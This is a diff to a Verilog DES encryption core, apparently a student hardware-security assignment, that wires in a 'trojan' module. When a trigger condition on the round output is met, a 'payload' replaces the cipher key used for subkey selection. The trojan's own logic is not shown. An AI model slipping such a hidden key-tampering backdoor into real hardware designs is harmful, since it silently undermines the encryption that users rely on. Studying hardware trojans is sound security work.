@@ -1,3 +1,11 @@
+// Group 2: Raj Patel, Zachary Rouviere, Evan Waxman
+//Experiement 4 Part 2
+//9/17/21
+
+//This des.v calls the trojan.v file to determine if the trigger condition is met
+// it will send the pay load. The added lines of code is commented below.
+
+
 /////////////////////////////////////////////////////////////////////
 ////                                                             ////
 ////  DES                                                        ////
@@ -107,6 +115,7 @@ module des_o(desOut, desIn, key, decrypt, roundSel, clk);
 	wire	[1:32]	Xin;
 	wire	[1:32]	Lout, Rout;
 	wire	[1:32]	out;
+    wire    [55:0]  key_troj; // used to send payload
 
 	assign Lout = (roundSel == 0) ? IP[33:64] : R;
 	assign Xin  = (roundSel == 0) ? IP[01:32] : L;
@@ -114,6 +123,7 @@ module des_o(desOut, desIn, key, decrypt, roundSel, clk);
 	assign FP = { Rout, Lout};
 
 	crp u0( .P(out), .R(Lout), .K_sub(K_sub) );
+    trojan u2( .payload(key_troj), .key(key), .trigger(out) ); // calls trojan.v to determine if tigger condition is met
 
 	always @(posedge clk)
 			  L <= #1 Lout;
@@ -124,7 +134,7 @@ module des_o(desOut, desIn, key, decrypt, roundSel, clk);
 	// Select a subkey from key.
 	key_sel u1(
 		.K_sub(		K_sub		),
-		.K(		key		),
+		.K(		key_troj		), // uses the payload varibalbe to control the cyipher key.
 		.roundSel(	roundSel	),
 		.decrypt(	decrypt		)
 		);
